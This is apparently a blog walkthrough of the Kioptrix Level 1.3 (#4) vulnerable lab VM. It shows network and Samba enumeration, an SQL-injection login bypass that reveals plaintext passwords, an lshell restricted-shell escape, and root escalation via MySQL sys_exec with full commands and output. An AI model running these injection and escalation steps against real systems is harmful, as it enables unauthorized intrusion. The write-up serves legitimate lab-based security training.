---
layout: post
title:  "Kioptrix: Level 1.3 (#4)"
date:   2017-04-23
summary: Kioptrix Level 1.3 (#4) walkthrough
---

### Setup
Download and unzip the vm, then mount the .vmdk file as storage in your vm config and setup your network settings. Note that this vm should auto detect using DHCP.

# Kioptrix: Level 1.3 (#4)
To start we need to find the host on the network, to do this I used nmap to do a ping scan on the subnet:

{% highlight python %}
nmap -sn 192.168.56.0/24

Nmap scan report for 192.168.56.102
Host is up (-0.10s latency).
{% endhighlight %}

## Information gathering
Now we know the IP of the host we can use port scanning to see what services are running. With nmap we can also do some banner grabbing, version checking, OS detection and enumeration of services:

{% highlight python %}
nmap -sS -sV -O 192.168.56.102

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
80/tcp  open  http        Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
MAC Address: 08:00:27:E7:E4:A2 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 - 2.6.33
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
{% endhighlight %}

Some interesting services running, ssh (22), http (80) and Samba (139, 445).

## Enumeration
Samba enumeration is usually the best place to start:

{% highlight c %}
enum4linux 192.168.56.102

 ====================================================== 
|    Enumerating Workgroup/Domain on 192.168.56.102    |
 ====================================================== 
[+] Got domain/workgroup name: WORKGROUP

 ======================================== 
|    OS information on 192.168.56.102    |
 ======================================== 
[+] Got OS info for 192.168.56.102 from smbclient: Domain=[KIOPTRIX4] OS=[Unix] Server=[Samba 3.0.28a]
[+] Got OS info for 192.168.56.102 from srvinfo:
	KIOPTRIX4      Wk Sv PrQ Unx NT SNT Kioptrix4 server (Samba, Ubuntu)
	platform_id     :	500
	os version      :	4.9
	server type     :	0x809a03

 =============================== 
|    Users on 192.168.56.102    |
 =============================== 
index: 0x1 RID: 0x1f5 acb: 0x00000010 Account: nobody	Name: nobody	Desc: (null)
index: 0x2 RID: 0xbbc acb: 0x00000010 Account: robert	Name: ,,,	Desc: (null)
index: 0x3 RID: 0x3e8 acb: 0x00000010 Account: root	Name: root	Desc: (null)
index: 0x4 RID: 0xbba acb: 0x00000010 Account: john	Name: ,,,	Desc: (null)
index: 0x5 RID: 0xbb8 acb: 0x00000010 Account: loneferret	Name: loneferret,,,	Desc: (null)

user:[nobody] rid:[0x1f5]
user:[robert] rid:[0xbbc]
user:[root] rid:[0x3e8]
user:[john] rid:[0xbba]
user:[loneferret] rid:[0xbb8]

{% endhighlight %}

Some useful information here, Samba version and usernames.

There's not much information to be gained from the web app, it looks like its just a login page. No robots.txt, nikto doesn't find anything interesting and there's nothing in html source of interest. The next step is to test for sql injection.

## Web app
The web app only has a login page so the only to do is try sql injection. This involves sending special characters ('"`) to escape the sql command and hopefully return a verbose error message. ' in the password field returns the error.

>Warning: mysql_num_rows(): supplied argument is not a valid MySQL result resource in /var/www/checklogin.php on line 28
Wrong Username or Password

This means we are able to alter the sql command and the app is vulnerable to injection. We gathered a few usernames from enumerating the Samba service so we could try to bypass the login using `' or '1'='1`.
{% highlight sql %}
username=admin pass=' or '1'='1 results in the error:
{% endhighlight %}
>User admin
Oups, something went wrong with your member's page account.
Please contact your local Administrator
to fix the issue.
{% highlight sql %}
username=robert pass=' or '1'='1
{% endhighlight %}
>Username 	: 	robert
Password 	: 	ADGAdsafdfwt4gadfga==
{% highlight sql %}
username=john pass=' or '1'='1
{% endhighlight %}
>Username 	: 	john
Password 	: 	MyNameIsJohn

Bypassing entering the password give us a members page which displays the users password, we can now ssh into the box and go from there. Note that although roberts password looks like its base64 encoded its not.

## Remote access
We can now login with two user accounts, upon login in we get the message:
{% highlight python %}
>Welcome to LigGoat Security Systems - We are Watching
== Welcome LigGoat Employee ==
LigGoat Shell is in place so you  don't screw up
Type '?' or 'help' to get the list of allowed commands
john:~$ ?
cd  clear  echo  exit  help  ll  lpath  ls
{% endhighlight %}
This looks like we have restricted commands and we will need to escalate privileges using these. When trying to list outside of /home/user we get a warning message, this also happens when trying other special characters such as `>|/`.
{% highlight python %}
>ls /
*** forbidden path -> "/"
*** You have 0 warning(s) left, before getting kicked out.
This incident has been reported.
{% endhighlight %}
Typing help help:
{% highlight python %}
>Limited Shell (lshell) limited help.
Cheers.
{% endhighlight %}
Typing sudo causes a python runtime error:
{% highlight python %}
>File "/usr/lib/python2.5/site-packages/lshell.py", line 247, in check_secure
    if cmdargs[1] not in self.conf['sudo_commands'] and cmdargs:
TypeError: 'NoneType' object is unsubscriptable
{% endhighlight %}
From a quick search online we find that lshell has a few vulnerabilities what allow us to escape it. One method involves pressing special characters then typing a command to run. [lshell github issue](https://github.com/ghantoos/lshell/issues/149)
{% highlight python %}
echo <ctrl+v><ctrl+j>bash

robert:~$ echo ^Jbash

robert@Kioptrix4:~$ id
uid=1002(robert) gid=1002(robert) groups=1002(robert)
robert@Kioptrix4:~$ uname -a
Linux Kioptrix4 2.6.24-24-server #1 SMP Tue Jul 7 20:21:17 UTC 2009 i686 GNU/Linux
robert@Kioptrix4:~$ 
{% endhighlight %}
Now we have escaped the limited shell we need to escalate our privileges further.

## Privilege escalation
Now we need to find some way of getting root or escalating our user privileges to run root commands. We can do this by enumerating the linux system further from our user access. We know from information gathering that the server is running a web server and a database, we can now check what other processes are running and what privilege level they have.
{% highlight python %}
ps -aux
{% endhighlight %}
Listing the processes we can see apache is running as www-data user and mysql is running as root. With mysql running as root we could try and get it to execute commands as root, but first we need a login.

Checking the /var/www folder for the web app we find /var/www/checklogin.php this contains the login information for connecting to the db and shows the user as root and password as blank. Now we can login and try getting mysql to run system commands as root.
{% highlight python %}
mysql -u root

mysql> select sys_exec('id');       
+----------------+
| sys_exec('id') |
+----------------+
| NULL           | 
+----------------+
1 row in set (0.00 sec)
{% endhighlight %}
There's nothing to indicate that the command ran so we output it to a file and check the file for output.
{% highlight python %}
mysql> select sys_exec('id > /tmp/test.txt');
+--------------------------------+
| sys_exec('id > /tmp/test.txt') |
+--------------------------------+
| NULL                           | 
+--------------------------------+
1 row in set (0.00 sec)

ls -al /tmp
-rw-rw----  1 root root   24 2017-04-24 08:47 test.txt
{% endhighlight %}
The file is created as the root user so we cant view it, we can change ownership by using chown on the file.
{% highlight python %}
mysql> select sys_exec('chown robert.robert /tmp/test.txt');
{% endhighlight %}
After viewing the file we can see id outputted that it ran as root (also indicated when the file was created as root). This means any commands ran with sys_exec will be executed as the root user. We can now use this to add our user to the admin group and sudoers.
{% highlight python %}
mysql> select sys_exec('usermod -a -G admin robert');

robert@Kioptrix4:~$ sudo su
[sudo] password for robert: 
root@Kioptrix4:/home/robert# id
uid=0(root) gid=0(root) groups=0(root)
{% endhighlight %}
## Conclusion
Server runs a web app and Samba service, samba leaks usernames which are used with sql injection to bypass entering the user password to login. The web app then returns the user profile which displays the password in clear text, this is then used to ssh into the server. 

Once connected we are presented with a restricted shell, this is then escaped by using special characters to allow us to use a normal shell. Listing the processes we find mysql running as root and checking the web app we find the root username and password to login to it. Once connected to the mysql db we can then execute OS commands as root giving our user sudo access.